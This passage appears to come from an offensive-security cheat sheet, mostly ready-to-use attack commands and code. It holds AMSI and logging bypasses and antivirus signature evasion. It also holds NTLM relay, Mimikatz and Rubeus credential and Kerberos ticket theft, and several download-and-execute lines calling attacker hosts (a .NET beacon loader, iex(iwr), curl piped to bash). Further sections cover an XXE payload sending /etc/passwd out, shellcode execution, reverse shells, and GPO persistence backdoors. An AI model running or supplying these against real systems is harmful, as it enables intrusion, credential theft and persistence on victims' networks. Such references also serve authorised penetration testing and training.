@attacker $ chisel-linux client 10.2.230.127:9010 5000:socks
# socks proxy can be accessed on port 5000 on attacker machine

# SOCKS server on attacker machine
@attacker $ chisel-linux server -p 8888 --reverse
@victim $ chisel-windows client 13.37.13.37:8888 R:5000:socks
# socks proxy can be accessed on port 5000 on attacker machine
```
### Bypassing XSS document.cookie filter using JavaScript Global Variables
```javascript
(alert)(window["document"]["cookie"]);
window["alert"](window["document"]["cookie"]);
self[/*foo*/"alert"](self[document"/*bar*/]["cookie"]);

self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"]);
```
### HTTP Requests with JavaScript
```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://attacker.com", false); // false means synchronous request
xhr.send(null);

/* ---- Oneliner ---- */
var xhr=new XMLHttpRequest();xhr.open("GET","https://attacker.com",false);xhr.send(null);

/* ---- with HTTP header ---- */
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://attacker.com", false); // false means synchronous request
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(null);

/* ---- POST Request with URL Form Data ---- */
var xhr = new XMLHttpRequest();
xhr.open("POST", 'https://attacker.com/exploit', true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("cmd=ls");
```
### Merlin C2 (90%) Antivirus Bypass Static Signatures
```bash
find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/ExecuteShell/RunCmd/g'
find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/executeShell/runCmd/g'
find . -name '*.go' -type f -print0 | xargs -0 sed -i 's/\/Ne0nd0g\/merlin/\/author\/c&c/g'
sed -i 's/\/Ne0nd0g\/merlin/\/author\/c&c/g' go.mod
```
### Enabling RDP with PowerShell
```powershell
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\' -Name 'fDenyTSConnections' -Value 0
```
### Extract All Links from Web App Page
```javascript
var urls = [];
for (var i = 0; i < document.links.length; i++) {
    urls.push(document.links[i].href);
}
var uniqUrls = new Set(urls);
console.log(Array.from(uniqUrls.values()));
```
### Shodan Search Filter Examples
```yaml
product:Apache
hostname:google.com,amazon.com
http.html:Apache			# search in HTML text for Apache
http.component:bootstrap
ssh port:22,3333
ssh -port:22				# search SSH servers running on non-standard port
city:"new york"
org:"google"
cloud.provider:"amazon"
ip:8.8.8.0/24,1.1.1.0/24
```
### NTLMv2 Relay Attack
```
cme smb 10.10.10.0/24 --gen-relay-list ntlm-targets.txt

vim Responder.conf

[Responder Core]
; Servers to start
...
SMB = Off     # Turn this off
HTTP = Off    # Turn this off

sudo ./Responder.py -I eth0
impacket-ntlmrelayx -tf ntlm-targets.txt -c 'powershell -noP -w 1 -enc YmFzZTY0LWVuY29kZWQtcmV2ZXJzZS1zaGVsbC1wYXlsb2FkLWdvZXMtaGVyZQ=='
```
### Generic PowerShell Bypass Techniques
```powershell
# Logging bypass:

(({}).gettype())."aSs`emblY"."Getty`PE"(('System.Manage'+'ment.Automati'+'on.Trac'+'ing.P'+'SEtwL'+'og'+'Pro'+'vi'+'d'+'e'+'r'))."gEtf`ieLD"(('etwProvi'+'de'+'r'),('Non'+'P'+'ublic,Static'))."Se`TVAL`Ue"($null,(New-Object System.Diagnostics.Eventing.EventProvider(New-Guid)))

# AMSI Bypass (old, burned)

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

# New AMSI bypass obfuscation:

[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))

# Neuter Writes to History Log:

Set-PSReadlineOption -HistorySaveStyle SaveNothing

# Encoded version of blocking writes to history

[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwBlAHQALQBQAFMAUgBlAGEAZABsAGkAbgBlAE8AcAB0AGkAbwBuACAALQBIAGkAcwB0AG8AcgB5AFMAYQB2AGUAUwB0AHkAbABlACAAUwBhAHYAZQBOAG8AdABoAGkAbgBnAA==')) | IEX

# Delete history logs

rm (Get-PSReadlineOption).HistorySavePath

# Constrained Language Mode Bypass

$command = @"
powershell -c "iex (cat c:\users\public\documents\Invoke-MemoryDump.ps1 | out-string); Invoke-MemoryDump -ProcID 544 -OutputPath 'C:\users\public\documents\out.dmp'"
"@

$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList $command
sleep 5

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
```
### Decode PEM/DER Certs with OpenSSL
```
openssl x509 -in CERTIFICATE.pem -text -noout
openssl x509 -inform der -in CERTIFICATE.der -text -noout
```
### CORS Exploitation Example
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Test Server</title>
</head>
<body>
  <script>
        var xhr = new XMLHttpRequest();

        xhr.open('GET', 'https://c7y12eh2vtc0000t1v50gd9yteryyyyyb.interact.sh', true); 
        xhr.withCredentials = true;

        xhr.onreadystatechange = () => {
            if(xhr.readyState === XMLHttpRequest.DONE) {
                console.log(xhr.responseText);
            }
        };
        xhr.send();
  </script>
</body>
</html>
```
### Remove Quarentine Bit from Mac OS App
```
sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app
```
### Slack: Common Folder Locations
- **Windows**: `%AppData%\Roaming\Slack`
- **MacOS**:
	- `~/Library/Application Support/Slack/`
	- `~/Library/Containers/com.tinyspeck.slackmacgap/Data/Library/Application Support/Slack`
- **Linux**: I would check the users `~` directory, as a hidden folder or in the `/opt` folder
### Slack: Important File Locations
```
Slack/storage/slack-workspaces or Slack/storage/slack-teams
Slack/storage/slack-downloads
Slack/storage/slack-workspaces
Slack/Cookies
```
### Get MSBuild Path with PowerShell
```powershell
dir HKLM:\SOFTWARE\Microsoft\MSBuild\ToolsVersions\
```
### Using MSBuild To Build Mimikatz
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe .\mimikatz.sln /t:Build /p:Configuration=Release /p:Platform=x64
```
### Injecting Shared Library with GDB
```bash
sudo gdb --batch --quiet --pid $PID -ex 'print (void *)__libc_dlopen_mode("evil.so", 2)'
```
### DLL Execution
```powershell
rundll32.exe Benign.dll,Evil
rundll32.exe shell32.dll,Control_RunDLL .\Payload.dll

# For regsvr32, a DLL must export the following functions:
# - EntryPoint()
# - DLLRegisterServer()
# - DLLUnregisterServer()
# - DLLInstall()
# DLLUnregisterServer isn't really required, and DLLInstall is where you should place you malicious code
# then run with:
regsvr32.exe /i Benign.dll
```
### Get Computer Info with PowerShell
```powershell
(Get-ComputerInfo).PSObject.Properties | ForEach { "Property={0}, Value={1}" -f $_.Name, $_.Value }
```
### Polyglot SSTI Payload
```
${{<%[%'"}}%\.
```
### MobSF Docker Setup
```
docker pull opensecurity/mobile-security-framework-mobsf:latest
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
```
### Oauth Configuration Endpoints
```
https://[authorizaion_server]/.well-known/oauth-authorization-server
https://[authorizaion_server]/.well-known/openid-configuration
```
### SSL/TLS SMTP Connect with OpenSSL
```
openssl s_client -starttls smtp -connect <server>:567
```
### SSTI to XSS Payload
```
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```
### JavaScript HTTP Request Example Using Fetch API
```javascript
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
</head>
<body>
  <script>
    fetch('https://oauth-acea1fd11f1bade4c0ffb7f702b100b3.web-security-academy.net/auth?' + new URLSearchParams({
      client_id:'w7dk53nyaiosziewu4hzb',
      redirect_uri:'https://exploit-ac2d1f401f56adaec08db72901de00e4.web-security-academy.net/callback',
      response_type:'code',
      scope:'openid profile email'
    }));
  </script>
</body>
</html>
```
### Recursively Download Files From SMB Directory with SMBclient
```
smbclient //10.10.10.10/Share
prompt off
recurse on
cd Creds
mget *
```
### Crack PFX Certificates with [P12tool](https://github.com/Ridter/p12tool)
```
p12tool --cert cert-to-crack.pfx --file /usr/share/wordlists/rockyou.txt
```
### XSS with Fullwidth Unicode Characters
```javascript
＜script＞alert(1)＜/script＞
```
### Replace All Href's with Attacker-Controlled URLs
```javascript
Array.from(document.getElementsByTagName("a")).forEach(function(i) {
  i.href = "https://gotcha.com";
});
```
### .NET Command Execute Template
```csharp
using System;
using System.Diagnostics;

namespace Evil
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Process process = new Process();

            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = "-c \"IEX((New-Object Net.Webclient).DownloadString(\'http://attacker.com/beacon.ps1\'))\"";
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.Start();
        }
    }
}
```
### Enumerate Services and Versions with CimInstance Command
```powershell
get-ciminstance -classname Win32_Product | select name, version
```
### Execute WinPEAS with PowerShell Reflection Assembly
```powershell
# Get latest release
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"; $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
```
### Get PowerShell's History File Across PowerShell Sessions
```powershell
(Get-PSReadlineOption).HistorySavePath
# ...\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
### Executables Commonly Not Flagged by AV
```
%windir%\sysnative\lsass.exe
%windir%\sysnative\svchost.exe
%windir%\sysnative\net.exe
%windir%\sysnative\werfault.exe
%windir%\sysnative\mstsc.exe
```
### PowerShell Pentesting Commands
```powershell
# Find files containing the word password
gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"

# Find files containing database connection strings
gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"

# Find web server configuration files
gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue

# Extract WiFi passwords
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

# Get auto-login credentials
gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"

# Check if AlwaysInstallElevated in enabled
gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated

# Single-port port scan
$port = 22
$net = "10.10.0."
0..255 | foreach { echo ((new-object Net.Sockets.TcpClient).Connect($net+$_,$port)) "Port $port is open on $net$_"} 2>$null

# Download and execute PowerShell script in memory
iex(iwr("https://attacker.com/evil.ps1"))

# Get all Antivirus products installed
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
```
### Encrypted/Encoded Msfvenom Payload
```
LHOST=10.1.1.10 LPORT=4444 msfvenom -p windows/x64/meterpreter_reverse_https --encrypt aes --encode x86/shikata_ga_nai -f exe -o payload.exe
```
### Azure AD Reconnaissance with [ADDInternals](https://github.com/Gerenios/AADInternals)
```powershell
# check if domain is accepting mail to Exchance Online (EXO)
Resolve-DnsName -Name <domain> -Type MX

# check if domain is sending mail from EXO
Resolve-DnsName -Name <domain> -Type TXT

# check both things with this one command
Invoke-AADIntReconAsOutsider -DomainName company.com | Format-Table

# check if a signle user exists
Invoke-AADIntUserEnumerationAsOutsider -UserName "user@company.com"

# use wordlists to enumerate users
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal
```
### Windows 32-bit/64-bit Folder Locations
|Folder Name|Folder Path|Description|
|---|---|---|
|System32|C:\Windows\System32|Windows System folder (system directory) for 64-bit files|
|SysWOW64|C:\Windows\SysWOW64|Windows System folder (system directory) for 32-bit files|
|Program Files|C:\Program Files|Folder for 64-bit program files|
|Program Files (x86)|C:\Program Files (x86)|Folder for 32-bit program files|

### Creating/Killing a Process with PowerShell CIM Instance
```powershell
# Starting calcp.exe
Invoke-CimMethod -classname win32_process -methodname create -Arguments @{commandline="calc.exe"}
# killing calculatorapp.exe
get-ciminstance -classname win32_process -filter 'name="calculatorapp.exe"' | remove-ciminstance
```
### Get .NET Framework Version Installed via Registry
```powershell
dir "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\"
gp "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\" -name release

```
### DOM-based XSS Payloads
```
; alert(1); <!–
“;alert(‘XSS’);//
“);alert(document.cookie);
2′;while(1){int i=1;}var xx=’1
; window.open(www.google.com);
‘;alert(String.fromCharCode(88,83,83))//
‘;var x=”XSS”;//&test=b’;alert(x);//
“><img src=1 onerror=prompt(0);>
</script>alert(‘xss’)
```
### Simple HTML File Upload XSS
```html
<html>
<title>
  test
</title>
	<script>alert(document.domain)</script>
</html>
```
### Markdown XSS Payloads
```
[Basic](javascript:alert('Basic'))
[Local Storage](javascript:alert(JSON.stringify(localStorage)))
[CaseInsensitive](JaVaScRiPt:alert('CaseInsensitive'))
[URL](javascript://www.google.com%0Aalert('URL'))
[In Quotes]('javascript:alert("InQuotes")')
![Escape SRC - onload](https://www.example.com/image.png"onload="alert('ImageOnLoad'))
![Escape SRC - onerror]("onerror="alert('ImageOnError'))
```
### Get Installed Software and Versions with Winget
```powershell
winget list
```
### Listing Services and Binary Paths
```powershell
sc query | select-string service_name
get-service | select name, status | ft
get-ciminstance win32_service | select name, pathname | ft
```
### PowerView Domain Enumeration
```powershell
get-domain
get-domaincontroller | select name, forest, osversion | ft
get-forestdomain | select name, domaincontrollers, parent, children | ft
get-domainpolicydata | select -expandproperty systemaccess # get password policy
get-domainuser -properties displayname, memberof, description | ft
get-domainuser -identity <user> -properties displayname, memberof, description | ft
get-domaincomputer -properties dnshostname
get-domainou -properties name | ft
get-domaingroup | select samaccountname
get-domaingroup | where name like "*admin*" | select samaccountname
get-domaingroupmemeber -identity "domain admins" | %{ $_.MemberName }
get-domaingpo -properties displayname
get-domaingpo -computeridentity computer1 -properties displayname
get-domaingpolocalgroup | select gpodisplayname, groupname | ft
get-netsession | select cname, username
get-netsession -computername computer1 | select cname, username
get-domaingpouserlocalgroupmapping -localgroup administrators | select objectname, displayname
get-domaintrusts
get-domaincomputer -unconstrained -properties samaccountname # find computers with unconstrained delegation enabled
get-domainuser patsy -properties samaccountname, msds-allowedtodelegateto | select -expand msds-allowedtodelegateto
convertfrom-sid S-1-5-21-1180699209-877415012-3182924384-1004 # convert SID to group/user name
# list computers within an OU
get-domaincomputer | ? { $_.distinguishedname -match "OU=Web Servers" } | select dnshostname
```
### SharpHound Collection Methods

- Default: Performs group membership collection, domain trust collection, local group collection, session collection, ACL collection, object property collection, and SPN target collection
- Group: Performs group membership collection
- LocalAdmin: Performs local admin collection
- RDP: Performs Remote Desktop Users collection
- DCOM: Performs Distributed COM Users collection
- PSRemote: Performs Remote Management Users collection
- GPOLocalGroup: Performs local admin collection using Group Policy Objects
- Session: Performs session collection
- ComputerOnly: Performs local admin, RDP, DCOM and session collection
- LoggedOn: Performs privileged session collection (requires admin rights on target systems)
- Trusts: Performs domain trust enumeration
- ACL: Performs collection of ACLs
- Container: Performs collection of Containers
- DcOnly: Performs collection using LDAP only. Includes Group, Trusts, ACL, ObjectProps, Container, and GPOLocalGroup.
- ObjectProps: Performs Object Properties collection for properties such as LastLogon or PwdLastSet
- All: Performs all Collection Methods except GPOLocalGroup

### SharpHound Example Usage
```
SharpHound.exe -c DcOnly
SharpHound.exe -d domain.local -c DcOnly
SharpHound.exe --zippassword "myStrongPasswd!@#" -c DcOnly
```
### PowerView AddDomainGroupMember
```powershell
# add user to domain group, stealthir alternative to "net user ... /add"
$secpassword = convertto-securestring 'password123!' -asplaintext -force
$cred = new-object system.management.automation.pscredential('VICTIM\admin', $secpassword)
add-domaingroupmember -identity 'domain admins' -members 'eviluser' -credential $cred
```
### Mimikatz Commands
- `sekurlsa::logonpasswords`: dump domain NTLM hashes from memory
- `sekurlsa::ekeys`: dump Kerberoas encryption keys from memory
- `lsadump::sam`: dump NTLM hashes for local accounts
- `lsadump::cache`: dump domain cached credentials
- `sekurlsa::pth`: Pass the Hash technique for lateral movement via impersonation
	- example: `mimikatz sekurlsa::pth /user:jdoe /domain:continental.local /ntlm:6af286f0509e7c166abf710850f44fc4 /run:powershell -w hidden -c whoami`
- `sekurlsa::tickets /export`: dump all Kerberoas tickets in memory
- `kerberos::ptt <.kirbi file>`: Pass the Ticket technique
- `vault::list`: list credential manager credentials
	- using `vaultcmd`: `vaultcmd /listcreds:"Windows Credentials" /all` 
### Rebues
```powershell
# --- Impersonation using TGTs
# Create a Kerberoas ticket and start cmd.exe with the security context of the ticket
Rubeus.exe asktgt /user:jwick /domain:continental.local /aes256:c5c2e54de9d2833a896306dbe2babf0c2a0d7091c25efbaa0b3138aceca4a058 /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
# List Kerberoas tickets
klist
# Create a file on disk of the base64-encoded Kerberoas ticket
# NOTE: when "createnetonly" argument is not used, create the ticket and use Cobalt Strike's "kerberoas_ticket_use" to use
# load the ticket into a logon session
make_token jwick HitMan!@12
[System.IO.File]::WriteAllBytes("c:\temp\jwick.kirbi", [System.Convert]::FromBase64String("Sm9obiB3aWNrIGlzIG15IG5hbWUK..."))
kerberoas_ticket_use c:\temp\jwick.kirbi

# List Kerberoas tickets in memory for logged on users
Rebeus.exe triage
# Dump Kerberoas ticket from memory
# NOTE: the LUID is obtained from running the "triage" command above
Rebeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
# Create a process to inject the Kerberoas ticket into
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
# Pass the ticket into the session associated with the cmd.exe process
# NOTE: the LUID is obtained from running the "createnetonly" command above
Rubeus.exe ptt /luid:<LUID> /ticket:Sm9obiB3aWNrIGlzIG15IG5hbWUK...

# --- Kerberoasting
Rebeus.exe kerberoast /user:svc_mysql /nowrap

# --- ASREP Roasting
Rubeus.exe asreproast /user:svc_mysql /nowrap

# --- Unconstrained Delegation
Rebeus.exe monitor /interval:30 /nowrap
Rebeus.exe monitor /targetuser:domainadmin /interval:30 /nowrap

# --- Constrained Delegation
Rebeus.exe s4u /user:svc_mysql /impersonateuser:domainadmin /aes256:38afdfead831df... /msdsspn:ldap/PRIMARY.testlab.local /opsec /ptt

# get information about TGT
Rebeus.exe describe /ticket:<path/to/tgt.kirbi>

# --- ADCS TGT Request
Rubeus.exe asktgt /user:jwick /certificate:C:\Temp\cert.pfx /password:<CERT_PASSWORD>
```
### BloodHound Queries
```
# Find all user's with SPNs
MATCH (n:User) WHERE n.hasspn=true RETURN n
# Find all ASREP roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u
# Find all computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
# Find old OSs
MATCH (H:Computer) WHERE H.operatingsystem =~ '.*(2000|2003|2008|xp|vista|7|me)*.' RETURN H
```
### Roasted Hash Cracking
```bash
# TGS
john --format=krb5tgs --wordlist=wordlist.txt hash.txt
hashcat -a 0 -m 13100 hash.txt wordlist.txt
# ASREP
john --format=krb5asrep --wordlist=wordlist.txt hash.txt
hashcat -a 0 -m 18200 hash.txt wordlist.txt
```
### Meterpreter Shellcode Injection
```
use post/windows/manage/shellcode_inject
set session 1
set shellcode /tmp/payload.bin
run
```
### Ntlmrelayx
```
ntlmrelayx.py -t smb://10.10.10.101 -smb2support --no-http-server --no-wcf-server
ntlmrelayx.py -t smb://10.10.10.101 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden...'
```
### Decrypting DPAPI Window Credential Blobs
1. Credential manager blobs are usually stored at `C:\Users\<user>\AppData\Local\Microsoft\Credentials`
2. Use Mimikatz to get the master key GUID of the blob:
```
dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<base32-blob-id>
```
3. Obtain the path to the master key by listing the contents of the following directory:
```
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<user-sid>
```
4. Use Mimikatz to obtain the actual master key:
```
dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<user-sid>\<master-key-guid> /rpc
```
5. Use Mimikatz to decrypt the credential blob:
```
dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<base32-blob-id> /masterkey:<master-key>
```
### Extrating TGTs from Linux Credential Cache
1. User TGTs reside in the `/tmp` folder - locate any file starting with **krb5cc**...
2. Use impacker to convert ccache tikcets to from **ccache** to **kirbi** format
```bash
./ticketConverter.py admin.ccache admin.kirbi
```
3. Use `Rubeus.exe ptt` or Cobalt Strike's `make_token` to load the ticket into a session
### Abusing ADCS with Certify
```powershell
# find CAs
Certify.exe cas /domain:domain.local
# Find all Microsoft enabled certificate templates
Certify.exe find /domain:domain.local
# Find all vulnerable certificate templates as low-priv user
Certify.exe find /vulnerable /domain:domain.local
# Find all vulnerable certificate templates using all groups the current user is a member of
Certify.exe find /vulnerable /domain:domain.local /currentuser
# Find all certificate templates and display their permissions
Certify.exe find /showAllPermissions /quiet
# Request certificate from CA using current user context
Certify.exe request /ca:SERVER-1\ca-1 /template:vulnTempl
# Request certificate from CA using the machines context
Certify.exe request /ca:SERVER-1\ca-1 /machine /template:vulnTempl
# Request certificate for another domain user
Certify.exe request /ca:SERVER-1\ca-1 /template:vulnTempl /altname:domain.admin
# Download a requested certificate
Certify.exe download /ca:SERVER\ca-name /id:X
```
### Convert ADCS PEM to PFX
```console
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
### Extract Key Manager Stored Credentials
```
rundll32 keymgr.dll,KRShowKeyMgr
cmdkey /list
```
### Execute Shellcode with SysCall Go
```go
func Exec(sc []byte) {
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		panic(err.Error())
	}
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	// Change protections to RX
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		panic(err.Error())
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
```
### Add/Remove Firewall Rule with Netsh
```console
netsh advfirewall firewall add rule name="Allow 1337" dir=in protocol=TCP localport=1337 action=allow
netsh advfirewall delete rule name="Allow 1337" protocol=TCP localport=1337
```
#### Add/Remove Firewall Rule with PowerShell
```console
New-NetFirewallRule -DisplayName "Allow 1337" -Profile Any -Direction Inbound -Action Allow -Protocol TCP -LocalPort @("1337")
Delete-NetFirewallRule -DisplayName "Allow 1337"
```
### Group Policy PowerShell Module
```powershell
Get-GPO
New-GPO
New-GPLink
Set-GPLink
Set-GPPrefRegistryValue
Get-GPOReport

# Link a new group policy to an OU
New-GPO "Enable backups" | New-GPLink -Target "OU=computers,DC=internal,DC=domain,DC=local"

# Create a registry group policy backdoor
PS C:\> Set-GPPrefRegistryValue -Name "PersistGPO" -Context User -Key "HKCU\Software\Policies\Microsoft\Windows\Control Panel" -ValueName "Persist" -Value "1" -Type String -Action Create -Value "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden c:\temp\reverse.exe"

# Update group policy on the current computer
Invoke-GPUpdate -Force

# Update group on a specific domain-joined computer
Invoke-GPUdate -Computer "CONTOSO\COMPUT2" -Force
```
### Get ACL for AD Objects
```powershell
get-domainobjectacl -identity matt.admin -domain contoso.local -resolveguids
get-domainou | get-domainobjectacl -resolveguids
```
### Modify Properties for AD Objects
```powershell
set-domainobject -identity john.wick -set @{serviceprincipalname="svc-1/computer"}
Set-DomainObject john.wick -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
set-domainobject -identity john.wick -clear serviceprincipalname
```
### PowerUpSQL
```powershell
# find local SQL servers
get-sqlinstancelocal -verbose
# find remote SQL servers
get-sqlinstancebroadcast -verbose
# find AD-joined SQL servers
get-sqlinstancedomain
# authenticate to SQL server as current user
get-sqlquery -instance "10.10.10.1,1433" -verbose
# authenticate to SQL server with credentials
get-sqlquery -instance "CONTOSO\sql-srv-1" -username john.wick -password "%$Aafl%241*#fea!"
# enumerate domain SQL servers
$serverinfo = get-sqlinstancedomain | get-sqlserverinfothreaded -threads 10 $serverinfo -verbose
```
### Check MS SQL Server Configuration for Command Execution
```sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```
### Windows Data Types to Go Data Types

|Windows Data Type|Go Data Type|
|---|---|
|BOOLEAN|byte|
|BOOL|int32|
|BYTE|byte|
|DWORD|uint32|
|DWORD32|uint32|
|DWORD64|uint64|
|WORD|uint16|
|HANDLE|uintptr (unsigned integer pointer)|
|LPVOID|uintptr|
|SIZE_T|uintptr|
|LPCVOID|uintptr|
|HMODULE|uintptr|
|LPCSTR|uintptr|
|LPDWORD|uintptr|

### Creating LNKs with PowerShell
```powershell
New-Item -ItemType SymbolicLink -Path "C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name "payload.lnk" -Value "c:\Temp\payload.exe"
```
### Lateral Movement with Outlook + WMI COM Objects
```powershell
$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application", "192.168.1.100"))
$a.CreateObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\cimv2").Get("Win32_Process").Create("cmd.exe")
```
### Lateral Movement via SSH
```bash
PAYLOAD='ping -c 1 10.10.10.1'

# attempting SSH payload execution on systems the root user connect to in the past
if [[ -f /root/.ssh/known_hosts]] && [[ -f /root/.ssh/id_rsa.pub ]]; then
	for HOST in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts)
		do
			ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $HOST $PAYLOAD
		done
fi

# attempting SSH payload execution on systems the current user connect to in the past
if [[ -f $HOME/.ssh/known_hosts]] && [[ -f $HOME/.ssh/id_rsa.pub ]]; then
	for HOST in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $HOME/.ssh/known_hosts)
		do
			ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $HOST $PAYLOAD
		done
fi
```
### Register Service on a Remote Machine
```console
sc \\10.10.100.1 create newservice binpath= C:\Temp\Malware.exe start= auto obj= <username> password= <password>
```
### Java: Execute Command
```java
Process process = Runtime.getRuntime().exec("curl 10.10.10.14/r.sh | bash");
// execute command from specific directory
Process process = Runtime.getRuntime().exec(
	new String[]{"powershell", "-c", "iwr", "-uri", "10.10.10.14/r.exe", "-Outfile", "."}, null, new File("C:\\Temp\\")
);
```
### ConPTYShell
#### Server
```bash
# You probably want to modify strings in the PowerShell script
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
mv Invoke-ConPtyShell.ps1 pty.ps1
stty raw -echo; (stty size; cat) | nc -nlvp 3001
```
#### Target
```powershell
IEX(IWR http://10.10.14.14/pty.ps1 -UseBasicParsing); Invoke-SomePtySh 10.10.14.14 3001
```
### Out-of-Band XXE Interaction
- Using external entity
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkgfafwaklax.interactsh.com"> ]>
```
- Using parameter entity
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkdwytuu763ax.interactsh.com"> %xxe; ]>
```
#### Data exfiltration with parameter entities
> Host file `malicious.dtd` with the following contents
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
- Then deliver the following payload to the vulnerable application which downloads the `malicious.dtd` from the attackers server and executes the XML
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
### SSRF Header List
